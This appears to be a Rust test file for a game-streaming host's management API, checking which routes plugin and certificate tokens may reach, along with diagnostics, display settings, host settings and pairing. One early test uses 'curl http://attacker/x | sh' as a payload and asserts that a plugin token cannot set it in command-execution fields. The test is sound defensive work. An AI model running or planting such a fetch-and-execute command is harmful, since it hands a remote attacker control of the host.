async fn plugin_lane_cannot_set_command_execution_fields() {
    let app = test_app(test_state(), None);

    let as_lane = |token: &str, method: &str, path: &str, body: serde_json::Value| {
        axum::http::Request::builder()
            .method(method)
            .uri(path)
            .header("content-type", "application/json")
            .header("authorization", format!("Bearer {token}"))
            .body(Body::from(body.to_string()))
            .unwrap()
    };

    let prep = serde_json::json!({
        "title": "Pwned",
        "prep": [{"do": "curl http://attacker/x | sh"}],
    });
    let command = serde_json::json!({
        "title": "Pwned",
        "launch": {"kind": "command", "value": "curl http://attacker/x | sh"},
    });
    for (path, method) in [
        ("/api/v1/library/custom", "POST"),
        ("/api/v1/library/custom/some-id", "PUT"),
    ] {
        for body in [&prep, &command] {
            let (status, err) =
                send(&app, as_lane("plugin-secret", method, path, body.clone())).await;
            assert_eq!(
                status,
                StatusCode::FORBIDDEN,
                "plugin token must not set an executed field via {method} {path}"
            );
            assert!(
                err["error"].as_str().unwrap().contains("host user"),
                "the refusal should say why: {err}"
            );
        }
    }
    // Reconcile replaces the whole set; a privileged field on any entry, not just the first, is refused.
    let sneaky = serde_json::json!([
        {"external_id": "a", "title": "Innocent"},
        {"external_id": "b", "title": "Pwned",
         "launch": {"kind": "command", "value": "curl http://attacker/x | sh"}},
    ]);
    let (status, _) = send(
        &app,
        as_lane(
            "plugin-secret",
            "PUT",
            "/api/v1/library/provider/romm",
            sneaky,
        ),
    )
    .await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "a privileged field anywhere in a reconcile payload must be refused"
    );

    // Refusals happen before the catalog is touched. Operator-lane converse:
    // `library::tests::privileged_field_is_command_execution_only`.
    assert!(
        crate::mgmt::auth::AuthLane::Admin.may_set_privileged_fields(),
        "the operator's token is the lane these fields belong to"
    );
    assert!(!crate::mgmt::auth::AuthLane::Plugin.may_set_privileged_fields());
    assert!(!crate::mgmt::auth::AuthLane::Cert.may_set_privileged_fields());
}

/// Every live route has an explicit plugin/cert classification. A new route fails until a
/// row is added here; a removed route must not leave a stale row. The gates are allowlists:
/// unclassified means denied.
#[test]
fn every_route_is_classified_for_the_plugin_and_cert_lanes() {
    use axum::http::Method;

    // (method, path, plugin_ok, cert_ok). One row per live operation; no wildcards.
    const EXPECTED: &[(&str, &str, bool, bool)] = &[
        // Host/status: plugin-readable; the small read-only set is the cert lane's.
        ("GET", "/api/v1/health", true, false), // always open, handled before either gate
        // The browser plane's certificate hash. Neither gate admits it and neither needs to:
        // `require_auth` exempts the path outright, because a browser that has never paired holds
        // no credential and the response authorises nothing — a certificate hash is what any peer
        // learns by connecting. See `mgmt::webtransport`.
        ("GET", "/api/v1/webtransport", false, false),
        // The device exchange. Same reason as the row above: `require_auth` exempts both paths,
        // because they are what a browser calls in order to authenticate at all. See
        // `mgmt::device_auth`.
        ("POST", "/api/v1/auth/device/challenge", false, false),
        ("POST", "/api/v1/auth/device/token", false, false),
        ("GET", "/api/v1/host", true, true),
        ("GET", "/api/v1/status", true, true),
        ("GET", "/api/v1/local/summary", true, false), // loopback-only, handled before the gates
        ("GET", "/api/v1/compositors", true, true),
        // Mode + accent of the desktop, for a console that follows it. Operator
        // decoration, so it sits with the other host configuration rather than on
        // the cert lane — no streaming client asks what colour the desktop is.
        ("GET", "/api/v1/host/theme", true, false),
        ("GET", "/api/v1/events", true, false),
        // Unredacted host tracing (webhook URLs, hook command lines). Plugin access would void `/hooks`.
        ("GET", "/api/v1/logs", false, false),
        // Diagnostics name the host user, groups, and device nodes. Both lanes denied.
        ("GET", "/api/v1/diagnostics", false, false),
        ("POST", "/api/v1/diagnostics/refresh", false, false),
        // Upload is the cert lane's single write (size/quota-capped). List/fetch/delete are operator-only.
        ("POST", "/api/v1/client-logs", false, true),
        ("GET", "/api/v1/client-logs", false, false),
        ("GET", "/api/v1/client-logs/{id}", false, false),
        ("DELETE", "/api/v1/client-logs/{id}", false, false),
        // Rosters: plugin-readable, never another paired client. Removal is pairing admin in both lanes.
        ("GET", "/api/v1/clients", true, false),
        // Bulk DELETE shares the GET path; method+path match, so the read grant must not empty the roster.
        ("DELETE", "/api/v1/clients", false, false),
        ("DELETE", "/api/v1/clients/{fingerprint}", false, false),
        // PATCH shares the DELETE path. Labels distinguish Moonlight certs (same subject); setting
        // one is pairing administration, not a roster read.
        ("PATCH", "/api/v1/clients/{fingerprint}", false, false),
        ("GET", "/api/v1/native/clients", true, false),
        ("DELETE", "/api/v1/native/clients", false, false),
        (
            "DELETE",
            "/api/v1/native/clients/{fingerprint}",
            false,
            false,
        ),
        // Grant/expiry edits are pairing administration in both lanes.
        (
            "PATCH",
            "/api/v1/native/clients/{fingerprint}",
            false,
            false,
        ),
        // Pairing administration + PIN visibility: operator token alone.
        ("GET", "/api/v1/pair", false, false),
        ("POST", "/api/v1/pair/pin", false, false),
        ("GET", "/api/v1/native/pair", false, false),
        ("DELETE", "/api/v1/native/pair", false, false),
        ("POST", "/api/v1/native/pair/arm", false, false),
        ("GET", "/api/v1/native/pending", false, false),
        ("POST", "/api/v1/native/pending/{id}/approve", false, false),
        ("POST", "/api/v1/native/pending/{id}/deny", false, false),
        // GPU + display: host configuration, no privilege boundary.
        ("GET", "/api/v1/gpus", true, false),
        ("PUT", "/api/v1/gpus/preference", true, false),
        ("GET", "/api/v1/display/settings", true, false),
        ("PUT", "/api/v1/display/settings", true, false),
        ("GET", "/api/v1/display/state", true, false),
        ("GET", "/api/v1/display/monitors", true, false),
        ("PUT", "/api/v1/display/layout", true, false),
        ("POST", "/api/v1/display/release", true, false),
        ("GET", "/api/v1/display/presets", true, false),
        ("POST", "/api/v1/display/presets", true, false),
        ("PUT", "/api/v1/display/presets/{id}", true, false),
        ("DELETE", "/api/v1/display/presets/{id}", true, false),
        // Per-device display settings. Same lane as the host-wide policy above and
        // deliberately no stricter: this route changes ONE device's behaviour, while
        // `PUT /display/settings` changes every device's. It carries no device identity
        // either — the fingerprint is the key, and the body is display behaviour.
        ("GET", "/api/v1/display/clients/{fingerprint}", true, false),
        ("PUT", "/api/v1/display/clients/{fingerprint}", true, false),
        (
            "DELETE",
            "/api/v1/display/clients/{fingerprint}",
            true,
            false,
        ),
        // Session control. Per-session stop/keyframe/mute ride the host-wide lane; the live
        // access re-point does not — that is access administration.
        ("DELETE", "/api/v1/session", true, false),
        ("POST", "/api/v1/session/idr", true, false),
        ("DELETE", "/api/v1/session/{id}", true, false),
        ("POST", "/api/v1/session/{id}/idr", true, false),
        ("PUT", "/api/v1/session/{id}/audio", true, false),
        ("PUT", "/api/v1/session/{id}/access", false, false),
        // Placing a player writes the device's pairing record, so it is pairing
        // administration too — and a cert caller is not bound to a session id, so it
        // could re-seat another session's controllers.
        ("PUT", "/api/v1/session/{id}/player", false, false),
        // Finished sessions: the same facts `/status` already shows a plugin about a live
        // one. Not the cert lane — it names every other client that streamed here.
        ("GET", "/api/v1/session/last", true, false),
        // Live pad feed: console lane only. A cert caller is not bound to a session
        // id, so it could watch another session's controller. A plugin has no use
        // for a 250 Hz input tap.
        ("GET", "/api/v1/session/{id}/pads", false, false),
        ("GET", "/api/v1/session/settings", true, false),
        ("PUT", "/api/v1/session/settings", true, false),
        ("POST", "/api/v1/game/end", true, false),
        // Library writes are plugin-lane (scanner job); privileged fields inside the payload
        // are refused in the handler — see `plugin_lane_cannot_set_command_execution_fields`.
        ("GET", "/api/v1/library", true, true),
        ("GET", "/api/v1/library/art/{id}/{kind}", true, true),
        ("GET", "/api/v1/library/scanners", true, false),
        ("PUT", "/api/v1/library/scanners/{id}", true, false),
        // Hide is operator curation; neither lane, unlike the scanner toggle.
        ("PUT", "/api/v1/library/hidden/{id}", false, false),
        ("POST", "/api/v1/library/custom", true, false),
        // The stored row names host paths (`detect`): operator only, like hide.
        ("GET", "/api/v1/library/custom/{id}", false, false),
        ("PUT", "/api/v1/library/custom/{id}", true, false),
        ("DELETE", "/api/v1/library/custom/{id}", true, false),
        ("PUT", "/api/v1/library/provider/{provider}", true, false),
        ("DELETE", "/api/v1/library/provider/{provider}", true, false),
        // Provider liveness is plugin-lane like reconcile; the host maps through the catalog.
        // Never the cert lane — a streaming client has no titles of its own.
        (
            "PUT",
            "/api/v1/library/provider/{provider}/running",
            true,
            false,
        ),
        // Stats.
        ("POST", "/api/v1/stats/capture/start", true, false),
        ("POST", "/api/v1/stats/capture/stop", true, false),
        ("GET", "/api/v1/stats/capture/status", true, false),
        ("GET", "/api/v1/stats/capture/live", true, false),
        ("GET", "/api/v1/stats/recordings", true, false),
        ("GET", "/api/v1/stats/recordings/{id}", true, false),
        ("DELETE", "/api/v1/stats/recordings/{id}", true, false),
        // Plugins: own directory entry and log ingest, never another plugin's UI secret.
        ("GET", "/api/v1/plugins", true, false),
        ("POST", "/api/v1/plugins/logs", true, false),
        ("PUT", "/api/v1/plugins/{id}", true, false),
        ("DELETE", "/api/v1/plugins/{id}", true, false),
        ("GET", "/api/v1/plugins/{id}/ui-credential", false, false),
        // A plugin asks for a folder and reads its own rows (its own token, not the shared
        // runner's — the handler 403s without a PluginIdentity). Deciding is operator-only,
        // so the overview and decide routes admit neither lane.
        ("POST", "/api/v1/plugin-access/requests", true, false),
        ("GET", "/api/v1/plugin-access/requests", true, false),
        ("GET", "/api/v1/plugin-access", false, false),
        (
            "POST",
            "/api/v1/plugin-access/{plugin}/decide",
            false,
            false,
        ),
        // Hooks: write is command execution as the host user; read exposes webhook creds.
        ("GET", "/api/v1/hooks", false, false),
        ("PUT", "/api/v1/hooks", false, false),
        // Store: installing a plugin runs new code with operator privileges.
        ("GET", "/api/v1/store/catalog", false, false),
        ("POST", "/api/v1/store/refresh", false, false),
        ("GET", "/api/v1/store/installed", false, false),
        ("POST", "/api/v1/store/install", false, false),
        ("POST", "/api/v1/store/uninstall", false, false),
        ("GET", "/api/v1/store/jobs", false, false),
        ("GET", "/api/v1/store/jobs/{id}", false, false),
        ("GET", "/api/v1/store/sources", false, false),
        ("PUT", "/api/v1/store/sources/{name}", false, false),
        ("DELETE", "/api/v1/store/sources/{name}", false, false),
        ("GET", "/api/v1/store/runtime", false, false),
        ("POST", "/api/v1/store/runtime", false, false),
        // Updates: `apply` runs an installer / the root helper.
        // Host settings: operator only. A plugin or a device must not reopen GameStream.
        ("GET", "/api/v1/host/settings", false, false),
        ("PATCH", "/api/v1/host/settings", false, false),
        ("GET", "/api/v1/host/audio/apps", false, false),
        ("GET", "/api/v1/update/status", false, false),
        ("POST", "/api/v1/update/check", false, false),
        ("POST", "/api/v1/update/apply", false, false),
        // Host actions: cert lane; handler filters discovery and requires GRANT_POWER on invoke.
        // Plugin token gets neither — power is operator-hook, not a shared-token capability.
        ("GET", "/api/v1/actions", false, true),
        ("POST", "/api/v1/actions/{id}", false, true),
    ];

    /// Substitute a literal for every `{param}` so the gates see a real request path.
    fn concrete(template: &str) -> String {
        template
            .split('/')
            .map(|s| if s.starts_with('{') { "sample" } else { s })
            .collect::<Vec<_>>()
            .join("/")
    }

    // PIN routes exist only in gamestream-featured builds; `cfg!` keeps both sides type-checked.
    let expected: Vec<(&str, &str, bool, bool)> = EXPECTED
        .iter()
        .copied()
        .filter(|(_, p, _, _)| {
            cfg!(feature = "gamestream") || !matches!(*p, "/api/v1/pair" | "/api/v1/pair/pin")
        })
        .collect();
    let doc: serde_json::Value = serde_json::from_str(&openapi_json()).unwrap();
    let mut live: Vec<(String, String)> = Vec::new();
    for (path, ops) in doc["paths"].as_object().unwrap() {
        for method in ops.as_object().unwrap().keys() {
            if matches!(method.as_str(), "get" | "post" | "put" | "delete" | "patch") {
                live.push((method.to_uppercase(), path.clone()));
            }
        }
    }

    // 1. Every live route has a row.
    for (method, path) in &live {
        assert!(
            expected.iter().any(|(m, p, _, _)| m == method && p == path),
            "route {method} {path} has no lane classification — add a row to EXPECTED in this test \
             and decide, deliberately, whether the plugin token and a paired streaming cert may \
             reach it"
        );
    }
    // 2. No stale rows for removed routes.
    for (method, path, _, _) in &expected {
        assert!(
            live.iter().any(|(m, p)| m == method && p == path),
            "EXPECTED lists {method} {path}, which is not in the live route table — remove the row"
        );
    }
    // 3. Gates match the classification on both lanes.
    for (method, path, plugin_ok, cert_ok) in &expected {
        let m = Method::from_bytes(method.as_bytes()).unwrap();
        let concrete = concrete(path);
        assert_eq!(
            auth::plugin_may_access(&m, &concrete),
            *plugin_ok,
            "plugin lane: {method} {path} should be {}",
            if *plugin_ok { "reachable" } else { "denied" }
        );
        assert_eq!(
            auth::cert_may_access(&m, &concrete),
            *cert_ok,
            "cert lane: {method} {path} should be {}",
            if *cert_ok { "reachable" } else { "denied" }
        );
    }
}

/// Segment-wise match: a path that merely starts with an allowed one is not swallowed.
/// A prefix deny also covers routes that do not exist yet.
#[test]
fn plugin_allowlist_matches_whole_segments_only() {
    use axum::http::Method;
    // UI credential sits one segment below an allowed route and must stay denied.
    assert!(auth::plugin_may_access(
        &Method::PUT,
        "/api/v1/plugins/rom-manager"
    ));
    assert!(!auth::plugin_may_access(
        &Method::GET,
        "/api/v1/plugins/rom-manager/ui-credential"
    ));
    // Unclassified sub-route of an allowed path stays denied.
    assert!(!auth::plugin_may_access(
        &Method::GET,
        "/api/v1/library/secrets"
    ));
    assert!(!auth::plugin_may_access(
        &Method::POST,
        "/api/v1/session/settings/x"
    ));
    assert!(auth::plugin_may_access(&Method::GET, "/api/v1/clients"));
    assert!(!auth::plugin_may_access(
        &Method::DELETE,
        "/api/v1/clients/aabbcc"
    ));
    // A letter-prefix that is not a segment prefix must not match.
    assert!(!auth::plugin_may_access(&Method::GET, "/api/v1/statuses"));
    assert!(!auth::plugin_may_access(
        &Method::GET,
        "/api/v1/library-secrets"
    ));
    // Whole-prefix: a later store/update route is denied by default.
    for path in [
        "/api/v1/store/some-route-that-does-not-exist-yet",
        "/api/v1/update",
        "/api/v1/update/apply-does-not-exist-yet",
    ] {
        assert!(
            !auth::plugin_may_access(&Method::GET, path),
            "plugin token must not reach {path}"
        );
        assert!(
            !auth::plugin_may_access(&Method::POST, path),
            "plugin token must not reach {path}"
        );
        assert!(
            !auth::cert_may_access(&Method::GET, path),
            "a paired streaming cert must not reach {path}"
        );
    }
}

/// Unique operationIds (codegen) and a current checked-in snapshot. `api/openapi.json` is
/// the default-features document; a native-only spec (no PIN routes) is intentionally not checked in.
#[cfg(feature = "gamestream")]
#[test]
fn openapi_document_is_complete_and_checked_in() {
    let json = openapi_json();
    let doc: serde_json::Value = serde_json::from_str(&json).unwrap();

    let paths = doc["paths"].as_object().unwrap();
    for p in [
        "/api/v1/health",
        "/api/v1/host",
        "/api/v1/status",
        "/api/v1/clients",
        "/api/v1/clients/{fingerprint}",
        "/api/v1/pair",
        "/api/v1/pair/pin",
        "/api/v1/session",
        "/api/v1/session/idr",
    ] {
        assert!(paths.contains_key(p), "spec is missing {p}");
    }

    let mut op_ids: Vec<&str> = paths
        .values()
        .flat_map(|ops| ops.as_object().unwrap().values())
        .filter_map(|op| op["operationId"].as_str())
        .collect();
    let total = op_ids.len();
    op_ids.sort_unstable();
    op_ids.dedup();
    assert_eq!(total, op_ids.len(), "duplicate operationIds");
    assert!(doc["components"]["securitySchemes"]["bearerAuth"].is_object());
    // Health overrides the document-global bearer; the spec must match `require_auth`.
    assert_eq!(
        doc["paths"]["/api/v1/health"]["get"]["security"],
        serde_json::json!([{}])
    );

    let checked_in = include_str!("../../../../api/openapi.json");
    // Structural compare with `info.version` normalized: a version bump must not fail the snapshot.
    // JSON compare also ignores CRLF checkouts on Windows.
    let mut generated = doc;
    let mut snapshot: serde_json::Value = serde_json::from_str(checked_in).unwrap();
    generated["info"]["version"] = serde_json::json!("<any>");
    snapshot["info"]["version"] = serde_json::json!("<any>");
    assert_eq!(
        generated, snapshot,
        "api/openapi.json is stale — regenerate with: \
         cargo run -p punktfunk-host -- openapi > api/openapi.json"
    );
}

fn post_json(path: &str, body: serde_json::Value) -> axum::http::Request<Body> {
    axum::http::Request::post(path)
        .header("content-type", "application/json")
        .body(Body::from(body.to_string()))
        .unwrap()
}

/// Verdicts carry the host user, group layout, and device-node state.
#[tokio::test]
async fn diagnostics_require_the_operator_token() {
    let app = test_app(test_state(), Some("sekrit"));

    for req in [
        get_req("/api/v1/diagnostics"),
        axum::http::Request::post("/api/v1/diagnostics/refresh")
            .body(Body::empty())
            .unwrap(),
    ] {
        let (status, body) = send(&app, req).await;
        assert_eq!(status, StatusCode::UNAUTHORIZED);
        assert!(body["error"].as_str().unwrap().contains("bearer"));
    }
}

/// Worst-first list; every registered check appears, including `ok` and `inapplicable`.
#[tokio::test]
async fn diagnostics_report_the_registered_checks() {
    // Process-global registry; take a first reading here rather than whatever a sibling left.
    crate::diagnostics::preflight();
    let app = test_app(test_state(), None);
    let (status, body) = send(&app, get_req("/api/v1/diagnostics")).await;
    assert_eq!(status, StatusCode::OK);

    assert!(body["ran_at_unix"].is_number(), "the report is stamped");
    let checks = body["checks"].as_array().expect("checks array");
    assert!(
        !checks.is_empty(),
        "the v1 catalog is registered at startup"
    );

    // Ids are console i18n keys; a rename silently drops every translation.
    let ids: Vec<&str> = checks.iter().filter_map(|c| c["id"].as_str()).collect();
    for expected in [
        "takeover_privilege",
        "virtual_deck_vhci",
        "uinput_access",
        "server_conflict",
    ] {
        assert!(ids.contains(&expected), "missing check {expected}: {ids:?}");
    }

    // N/N−1 on the wire: an older console has only these strings to render.
    for check in checks {
        let id = check["id"].as_str().unwrap();
        assert!(
            !check["summary"]
                .as_str()
                .unwrap_or_default()
                .trim()
                .is_empty(),
            "{id}: summary must never be empty"
        );
        assert!(
            matches!(
                check["status"].as_str(),
                Some("ok" | "warn" | "fail" | "inapplicable")
            ),
            "{id}: unexpected status {:?}",
            check["status"]
        );
        if check["status"] == "fail" {
            assert!(
                !check["remedy"]["text"]
                    .as_str()
                    .unwrap_or_default()
                    .trim()
                    .is_empty(),
                "{id}: a failing check must tell the operator what to do"
            );
        }
    }
}

#[tokio::test]
async fn diagnostics_refresh_reruns_and_returns_the_report() {
    let app = test_app(test_state(), None);
    let req = axum::http::Request::post("/api/v1/diagnostics/refresh")
        .body(Body::empty())
        .unwrap();
    let (status, body) = send(&app, req).await;
    assert_eq!(status, StatusCode::OK);

    let checks = body["checks"].as_array().expect("checks array");
    assert!(!checks.is_empty(), "refresh answers with the full catalog");
    // Do not assert `source: "refresh"`: the registry is process-global and a sibling may have
    // primed a startup reading. Isolated pin: `diagnostics::tests::refresh_reruns_every_probe`.
    assert!(checks.iter().all(|c| c["id"].is_string()));
}

/// GET-only: `prefs()` is a process-global `OnceLock`, so a PUT would race other tests.
/// `keep_alive: forever` is read off the gaming-rig preset without writing.
#[tokio::test]
async fn display_settings_surface() {
    let app = test_app(test_state(), None);

    let (status, body) = send(&app, get_req("/api/v1/display/settings")).await;
    assert_eq!(status, StatusCode::OK);
    let presets = body["presets"].as_array().expect("presets array");
    assert_eq!(
        presets.len(),
        5,
        "all five named presets are surfaced for the console picker"
    );
    assert!(
        body["effective"]["keep_alive"].is_object(),
        "the effective policy is echoed"
    );
    let gaming = presets
        .iter()
        .find(|p| p["id"] == "gaming-rig")
        .expect("gaming-rig preset surfaced");
    assert_eq!(
        gaming["fields"]["keep_alive"]["mode"], "forever",
        "gaming-rig is keep_alive: forever"
    );
    let enforced: Vec<&str> = body["enforced"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|v| v.as_str())
        .collect();
    assert!(enforced.contains(&"keep_alive"));
    assert!(enforced.contains(&"topology"));
    assert!(enforced.contains(&"mode_conflict"));
    assert!(enforced.contains(&"identity"));
    assert!(enforced.contains(&"layout"));
    // The console renders this list verbatim and hides anything absent from it
    // (design/web-console-overhaul.md D1), so a name here is a control an operator can
    // click. A build that cannot act on a field must not advertise it.
    assert_eq!(
        enforced.contains(&"ddc_power_off"),
        cfg!(target_os = "windows"),
        "DDC/CI power-off is the Windows exclusive-isolate lever"
    );
    assert_eq!(
        enforced.contains(&"pnp_disable_monitors"),
        cfg!(target_os = "windows"),
        "PnP monitor-disable is the Windows exclusive-isolate lever"
    );
    // These three are additionally conditional ON their platform — an AMD driver, the
    // MIRROR backend, a gamescope binary — so only the negative direction is universal.
    assert!(
        !enforced.contains(&"edid_lock") || cfg!(target_os = "windows"),
        "EDID lock is the AMD driver's connector emulation, which exists only on Windows"
    );
    assert!(
        !enforced.contains(&"capture_monitor") || cfg!(target_os = "linux"),
        "pinning a real monitor needs the Linux MIRROR backend"
    );
    assert!(
        !enforced.contains(&"game_session") || cfg!(target_os = "linux"),
        "a dedicated game session is a headless gamescope spawn"
    );
}

/// `/host/settings`: a PATCH stores, `null` resets, and a refused value writes nothing and names
/// the setting. Env beating the store is `pf-host-config`'s test, against a fake environment.
/// Uses only restart-class rows, so a concurrent session test never sees a changed value.
#[allow(clippy::await_holding_lock)]
#[tokio::test]
async fn host_settings_surface() {
    let dir = ConfigDirOverride::new();
    pf_host_config::reload();
    let app = test_app(test_state(), None);
    let patch = |body: serde_json::Value| {
        axum::http::Request::patch("/api/v1/host/settings")
            .header("content-type", "application/json")
            .body(Body::from(body.to_string()))
            .unwrap()
    };
    let row = |body: &serde_json::Value, id: &str| {
        body["settings"]
            .as_array()
            .unwrap()
            .iter()
            .find(|r| r["id"] == id)
            .cloned()
            .unwrap_or_else(|| panic!("no {id} row"))
    };

    let (status, body) = send(&app, get_req("/api/v1/host/settings")).await;
    assert_eq!(status, StatusCode::OK);
    let name = row(&body, "host_name");
    assert_eq!(name["source"], "default");
    assert_eq!(name["kind"], "text");
    assert_eq!(name["apply"], "restart");
    assert_eq!(name["env"], "PUNKTFUNK_HOST_NAME");
    let ids: Vec<&str> = body["settings"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|r| r["id"].as_str())
        .collect();
    assert_eq!(
        ids.contains(&"max_fps"),
        cfg!(target_os = "linux"),
        "a row this host does not act on is absent, not disabled"
    );

    let (status, body) = send(
        &app,
        patch(serde_json::json!({"host_name": "Den", "webtransport": true})),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(row(&body, "host_name")["value"], "Den");
    assert_eq!(row(&body, "host_name")["source"], "store");
    let file: serde_json::Value =
        serde_json::from_slice(&std::fs::read(dir.path().join("host-settings.json")).unwrap())
            .unwrap();
    assert_eq!(file["webtransport"], true);

    let (status, err) = send(
        &app,
        patch(serde_json::json!({"webtransport": false, "host_name": "x".repeat(64)})),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(err["error"].as_str().unwrap().contains("host_name"));
    let (status, _) = send(&app, patch(serde_json::json!({"no_such_setting": 1}))).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let (_, body) = send(&app, get_req("/api/v1/host/settings")).await;
    assert_eq!(
        row(&body, "webtransport")["value"],
        true,
        "a refused patch writes nothing"
    );

    let (status, body) = send(
        &app,
        patch(serde_json::json!({"host_name": null, "webtransport": null})),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(row(&body, "host_name")["source"], "default");
    assert!(row(&body, "webtransport")["stored"].is_null());
    drop(dir);
    pf_host_config::reload();
}

/// The per-device overlay routes (`design/web-console-overhaul.md` §6.1).
///
/// **Read-only on purpose.** `policy::prefs()` is a process-global `OnceLock`
/// bound to whatever `PUNKTFUNK_CONFIG_DIR` said at its FIRST use anywhere in
/// this binary, so `ConfigDirOverride` cannot move it afterwards — a test that
/// PUT a policy here wrote to the developer's real `display-settings.json`.
/// Resolution, sanitisation and the insert/remove round-trip are covered
/// against in-memory policies in `pf-vdisplay`'s `policy::tests::client_overlay`;
/// what is worth asserting HERE is the wiring the console depends on.
#[tokio::test]
async fn display_client_overlay_is_served_beside_the_policy_never_inside_it() {
    let app = test_app(test_state(), None);

    // An unknown device is "follows host", not 404: absent fields ARE the answer.
    let (status, body) = send(&app, get_req("/api/v1/display/clients/aa11")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body, serde_json::json!({}));

    let (status, body) = send(&app, get_req("/api/v1/display/settings")).await;
    assert_eq!(status, StatusCode::OK);
    assert!(
        body.get("clients").is_some(),
        "overlays ride their own field so one fetch paints the device rows"
    );
    assert!(
        body["settings"].get("clients").is_none(),
        "and never inside `settings`, which the console PUTs back whole"
    );

    // Only fields this build actually acts on per device, and never one the host
    // does not act on at all — the console renders this list verbatim (D1).
    let per_device: Vec<&str> = body["client_enforced"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|v| v.as_str())
        .collect();
    assert!(per_device.contains(&"mode_conflict"));
    let host_wide: Vec<&str> = body["enforced"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|v| v.as_str())
        .collect();
    // A field that IS a host axis must be enforced host-wide too — offering it per device
    // while the host ignores it everywhere would be the dead control D1 is about. Fields
    // that exist only per device (a mode cap, a scale) have no host-wide twin to check.
    const HOST_AXES: [&str; 4] = ["keep_alive", "topology", "mode_conflict", "identity"];
    for field in per_device.iter().filter(|f| HOST_AXES.contains(f)) {
        assert!(
            host_wide.contains(field),
            "{field} is offered per-device but this build does not act on it at all"
        );
    }
}

/// The bug this exists for: `clients` never rides the wire, so a host-wide PUT always arrives
/// with an empty map, and the store replaces the whole policy. Without the carry-across, every
/// preset click silently reverted every device to the host policy.
///
/// Pure on purpose — `policy::prefs()` is a process-global bound to the config dir at its first
/// use anywhere in this binary, so a test that drove the real route would write to the
/// developer's own `display-settings.json`.
#[test]
fn a_host_wide_save_carries_the_stored_overlays_across() {
    use crate::vdisplay::policy::{ClientOverlay, DisplayPolicy, KeepAlive, Preset};
    let mut stored = DisplayPolicy::default();
    stored.clients.insert(
        "aa11".into(),
        ClientOverlay {
            keep_alive: Some(KeepAlive::Forever),
            ..ClientOverlay::default()
        },
    );
    // What the console sends back: the policy it was served, which carries no overlays.
    let incoming = DisplayPolicy {
        preset: Preset::Workstation,
        ..DisplayPolicy::default()
    };
    assert!(incoming.clients.is_empty(), "the wire never carries them");

    let merged = super::display::with_stored_overlays(incoming, &stored);
    assert_eq!(
        merged.preset,
        Preset::Workstation,
        "the operator's change lands"
    );
    assert_eq!(
        merged.effective_for(Some("aa11")).keep_alive,
        KeepAlive::Forever,
        "and the device keeps its own pin"
    );
}

/// A stale console must not be able to revert per-device work it never saw by
/// PUTting back the whole policy object it fetched earlier. Refused before any
/// write, so this asserts the guard without touching the store.
#[tokio::test]
async fn the_host_wide_policy_put_refuses_to_carry_overlays() {
    let app = test_app(test_state(), None);
    let (status, _) = send(
        &app,
        put_json(
            "/api/v1/display/settings",
            serde_json::json!({
                "preset": "default",
                "clients": {"aa11": {"mode_conflict": "join"}}
            }),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
}

/// No backend has created a display here (non-Windows reports none): empty `/state`, no-op `/release`.
#[tokio::test]
async fn display_state_and_release_empty() {
    let app = test_app(test_state(), None);

    let (status, body) = send(&app, get_req("/api/v1/display/state")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        body["displays"].as_array().map(|a| a.len()),
        Some(0),
        "no managed displays on an idle test host"
    );

    let (status, body) = send(
        &app,
        post_json("/api/v1/display/release", serde_json::json!({})),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["released"], 0);
}

/// Always 200 with a well-formed envelope, even with no compositor. Enumeration failure is
/// an `error` string beside an empty list, never a 5xx.
#[tokio::test]
async fn display_monitors_answers_even_with_no_compositor() {
    let app = test_app(test_state(), None);

    let (status, body) = send(&app, get_req("/api/v1/display/monitors")).await;
    assert_eq!(status, StatusCode::OK);
    assert!(body["monitors"].is_array(), "monitors is always an array");
    let listed = body["monitors"].as_array().map(|a| a.len()).unwrap_or(0);
    // gamescope owns no physical heads, so empty-and-silent is correct. A leftover
    // `gamescope-0` socket makes `detect()` resolve gamescope on a dev box that was in game mode.
    let nested = body["compositor"] == "gamescope";
    assert!(
        listed > 0 || !body["error"].is_null() || body["compositor"].is_null() || nested,
        "an empty list must carry an error, an absent compositor, or a nested one: {body}"
    );
    // Pin is reported so the console can flag a missing monitor; unset here.
    assert!(body["pinned"].is_null(), "no PUNKTFUNK_CAPTURE_MONITOR set");
}

#[tokio::test]
async fn native_pairing_arm_show_and_unpair() {
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-np-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());

    let (s, b) = send(&app, get_req("/api/v1/native/pair")).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["enabled"], true);
    assert_eq!(b["armed"], false);
    assert!(b["pin"].is_null());

    let (s, b) = send(
        &app,
        post_json(
            "/api/v1/native/pair/arm",
            serde_json::json!({"ttl_secs": 60}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["armed"], true);
    let pin = b["pin"].as_str().unwrap().to_string();
    assert_eq!(pin.len(), 4);
    let (_, b) = send(&app, get_req("/api/v1/native/pair")).await;
    assert_eq!(b["pin"], pin);
    assert!(b["expires_in_secs"].as_u64().unwrap() <= 60);

    // QUIC reads the same live PIN.
    assert_eq!(np.current_pin().as_deref(), Some(pin.as_str()));

    np.add("Test Device", "abc123").unwrap();
    let (s, b) = send(&app, get_req("/api/v1/native/clients")).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b[0]["name"], "Test Device");
    assert_eq!(b[0]["fingerprint"], "abc123");
    let del = axum::http::Request::delete("/api/v1/native/clients/ABC123")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, del).await.0, StatusCode::NO_CONTENT);
    let missing = axum::http::Request::delete("/api/v1/native/clients/abc123")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, missing).await.0, StatusCode::NOT_FOUND);

